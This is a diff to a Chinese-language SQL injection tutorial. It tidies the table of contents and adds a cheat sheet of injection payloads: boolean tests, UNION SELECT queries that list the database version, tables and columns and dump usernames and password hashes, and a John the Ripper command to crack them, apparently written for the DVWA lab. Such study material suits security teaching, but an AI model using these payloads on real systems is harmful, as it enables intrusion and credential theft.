@@ -1,11 +1,11 @@
 - [SQL Injection](#sql-injection)
-    - [Overview](#overview)
-    - [漏洞探测](#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B)
-        - [整型参数](#%E6%95%B4%E5%9E%8B%E5%8F%82%E6%95%B0)
-        - [字符串参数](#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%82%E6%95%B0)
-        - [特殊情况处理](#%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5%E5%A4%84%E7%90%86)
-    - [常用 SQL Injection 语句](#%E5%B8%B8%E7%94%A8-sql-injection-%E8%AF%AD%E5%8F%A5)
-    - [防范方法](#%E9%98%B2%E8%8C%83%E6%96%B9%E6%B3%95)
+  - [Overview](#overview)
+  - [漏洞探测](#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B)
+    - [整型参数](#%E6%95%B4%E5%9E%8B%E5%8F%82%E6%95%B0)
+    - [字符串参数](#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%82%E6%95%B0)
+    - [特殊情况处理](#%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5%E5%A4%84%E7%90%86)
+  - [常用 SQL Injection 语句](#%E5%B8%B8%E7%94%A8-sql-injection-%E8%AF%AD%E5%8F%A5)
+  - [防范方法](#%E9%98%B2%E8%8C%83%E6%96%B9%E6%B3%95)
 
 # SQL Injection 
 
@@ -99,6 +99,46 @@ SELECT * FROM table_name FROM col_name WHERE p = 'YY'
 
 - http://xxx.xxx/index.asp?p=YY and(select @@version)>0     
   用于获取 SQL Server 版本号；
+
+
+
+```
+# Basic Injection
+1
+1' and '1'='1
+1' and '1'='2
+
+# Display All Records
+%' or '1'='1
+
+# Display Database Version
+%' union select null, version() #
+
+# Display Database User
+%' union select null, user() #
+
+# Display Database Name
+%' union select null, database() #
+
+# Display all tables in information_schema
+%' union select null, table_name from information_schema.tables #
+
+# Display all the user tables in information_schema
+# % -- wildcard
+%' union select null, table_name from information_schema.tables where table_name like 'user%' #
+
+# Display all the columns fields in the information_schema user table
+# 0x0a -- new line
+%' union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
+
+# Display all the columns field contents in the information_schema user table
+%' union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+
+#Crack Weak Passwords Using John
+john -format=raw-MD5 dvwa-pass.txt
+
+```
+
 
 ## 防范方法
 
